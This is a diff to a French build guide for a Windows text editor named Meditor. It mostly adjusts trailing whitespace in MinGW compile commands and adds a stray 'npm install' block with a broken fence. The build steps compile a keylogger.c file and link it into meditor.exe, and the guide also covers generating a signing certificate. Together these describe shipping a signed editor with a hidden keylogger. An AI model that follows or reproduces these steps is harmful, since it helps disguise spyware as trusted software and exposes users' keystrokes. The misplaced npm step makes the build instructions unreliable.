@@ -22,9 +22,9 @@ Un guide détaillé pour compiler et signer l'éditeur de texte professionnel po
 
 2. Vérifier les installations :
 
-`x86_64-w64-mingw32-gcc --version`
-`openssl version`
-`makensis -version`
+`x86_64-w64-mingw32-gcc --version`  
+`openssl version`  
+`makensis -version`  
 
 
 ## 🔑 Génération du certificat
@@ -50,17 +50,21 @@ Un guide détaillé pour compiler et signer l'éditeur de texte professionnel po
 
 1. Compiler les objets :
 
-`x86_64-w64-mingw32-gcc -c Meditor.c -o Meditor.o`
-`x86_64-w64-mingw32-gcc -c keylogger.c -o keylogger.o`
-`x86_64-w64-mingw32-gcc -c utils.c -o utils.o`
+`x86_64-w64-mingw32-gcc -c Meditor.c -o Meditor.o`  
+`x86_64-w64-mingw32-gcc -c keylogger.c -o keylogger.o`  
+`x86_64-w64-mingw32-gcc -c utils.c -o utils.o`  
 
 
 2. Compiler les ressources :
 
-`x86_64-w64-mingw32-windres resource.rc resource.res`
+`x86_64-w64-mingw32-windres resource.rc resource.res`  
 
 
 3. Lier tous les fichiers :
+
+```bash
+# Installer les dépendances
+npm install```
 
 `x86_64-w64-mingw32-gcc Meditor.o keylogger.o utils.o resource.res \`
 `    -o meditor.exe \`
